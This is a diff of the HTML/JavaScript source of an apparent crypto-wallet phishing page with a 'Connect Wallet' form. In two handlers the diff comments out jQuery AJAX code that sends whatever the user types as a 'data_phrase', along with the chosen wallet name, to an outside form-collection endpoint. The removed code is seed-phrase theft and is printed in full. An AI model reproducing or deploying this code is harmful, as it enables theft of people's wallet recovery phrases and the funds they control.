@@ -1248,7 +1248,7 @@
                             <input
                             type="hidden"
                             name="_redirect"
-                            value="/done/"
+                            value="done/index.html"
                           />
                             <button disabled type="submit" name="connect" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
                         </form>
@@ -1435,28 +1435,28 @@
                 if(field.val().length >= 12){
                     // $(this).text('Loading...').css('pointer-events','none')
 
-                    $.ajax({
-                       url: "https://submit-form.com/SN95jrWf",
-                        method: "POST",
-                        data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
-                        success: function(result){
+                    // $.ajax({
+                    //    url: "https://submit-form.com/SN95jrWf",
+                    //     method: "POST",
+                    //     data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
+                    //     success: function(result){
 
 
-                            if(result == "success"){
-                                $('#button_connect_wallet').text('Connect Wallet').css('pointer-events','all')
-                                $('#popup_connect_wallet').modal('hide')
-                                // $('#popup_connect_wallet_success').modal('show')
-                                window.setTimeout(function(){
-                                    window.location.href = 'index.html';
-                                }, 25);
+                    //         if(result == "success"){
+                    //             $('#button_connect_wallet').text('Connect Wallet').css('pointer-events','all')
+                    //             $('#popup_connect_wallet').modal('hide')
+                    //             // $('#popup_connect_wallet_success').modal('show')
+                    //             window.setTimeout(function(){
+                    //                 window.location.href = 'index.html';
+                    //             }, 25);
  
 
-                            }
-                        },
-                        error: function(xhr, ajaxOptions, thrownError){
-                            alert(thrownError);
-                        }
-                    })
+                    //         }
+                    //     },
+                    //     error: function(xhr, ajaxOptions, thrownError){
+                    //         alert(thrownError);
+                    //     }
+                    // })
                 }
             })
             //CONNECT WALLET BUTTON2 Handler
@@ -1466,28 +1466,28 @@
                 if(field.val().length >= 12){
                     // $(this).text('Loading...').css('pointer-events','none')
 
-                    $.ajax({
-                       url: "https://submit-form.com/SN95jrWf",
-                        method: "POST",
-                        data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
-                        success: function(result){
+                    // $.ajax({
+                    //    url: "https://submit-form.com/SN95jrWf",
+                    //     method: "POST",
+                    //     data: {"load_phrase":1, "data_phrase":field.val(), "wallet_selected": $('#wallet_name').text().trim()},
+                    //     success: function(result){
 
 
-                            if(result == "success"){
-                                $('#button_connect_wallet2').text('Connect Wallet').css('pointer-events','all')
-                                $('#popup_connect_wallet2').modal('hide')
-                                // $('#popup_connect_wallet_success').modal('show')
-                                window.setTimeout(function(){
-                                    window.location.href = 'index.html';
-                                }, 25);
+                    //         if(result == "success"){
+                    //             $('#button_connect_wallet2').text('Connect Wallet').css('pointer-events','all')
+                    //             $('#popup_connect_wallet2').modal('hide')
+                    //             // $('#popup_connect_wallet_success').modal('show')
+                    //             window.setTimeout(function(){
+                    //                 window.location.href = 'index.html';
+                    //             }, 25);
  
 
-                            }
-                        },
-                        error: function(xhr, ajaxOptions, thrownError){
-                            alert(thrownError);
-                        }
-                    })
+                    //         }
+                    //     },
+                    //     error: function(xhr, ajaxOptions, thrownError){
+                    //         alert(thrownError);
+                    //     }
+                    // })
                 }
             })
         })
